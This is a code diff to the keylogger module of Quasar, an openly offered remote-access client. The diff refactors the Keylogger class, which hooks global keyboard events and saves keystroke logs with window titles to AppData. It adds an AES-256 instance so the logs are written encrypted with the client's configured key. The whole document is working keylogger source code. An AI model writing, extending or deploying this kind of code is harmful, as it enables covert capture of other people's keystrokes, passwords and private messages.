@@ -2,6 +2,7 @@
 using Quasar.Client.Config;
 using Quasar.Client.Helper;
 using Quasar.Client.Networking;
+using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
 using System;
 using System.Collections.Generic;
@@ -32,15 +33,16 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// The directory where the log files will be saved.
         /// </summary>
-        public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME); } }
+        public static string LogDirectory => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME);
 
         private readonly Timer _timerFlush;
-        private StringBuilder _logFileBuffer;
-        private List<Keys> _pressedKeys = new List<Keys>();
-        private List<char> _pressedKeyChars = new List<char>();
-        private string _lastWindowTitle;
+        private readonly StringBuilder _logFileBuffer = new StringBuilder();
+        private readonly List<Keys> _pressedKeys = new List<Keys>();
+        private readonly List<char> _pressedKeyChars = new List<char>();
+        private string _lastWindowTitle = string.Empty;
         private bool _ignoreSpecialKeys;
         private IKeyboardMouseEvents _mEvents;
+        private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
 
         /// <summary>
         /// Creates the keylogger instance that provides keylogging functionality and starts it.
@@ -49,9 +51,6 @@ namespace Quasar.Client.Utilities
         public Keylogger(double flushInterval)
         {
             Instance = this;
-            _lastWindowTitle = string.Empty;
-            _logFileBuffer = new StringBuilder();
-
             Subscribe(Hook.GlobalEvents());
 
             _timerFlush = new Timer { Interval = flushInterval };
@@ -276,11 +275,10 @@ namespace Quasar.Client.Utilities
 
                 if (_logFileBuffer.Length > 0)
                 {
-
                     logFile.Append(_logFileBuffer);
                 }
 
-                FileHelper.WriteLogFile(filename, logFile.ToString(), Settings.ENCRYPTIONKEY);
+                FileHelper.WriteLogFile(filename, logFile.ToString(), _aesInstance);
 
                 logFile.Clear();
             }
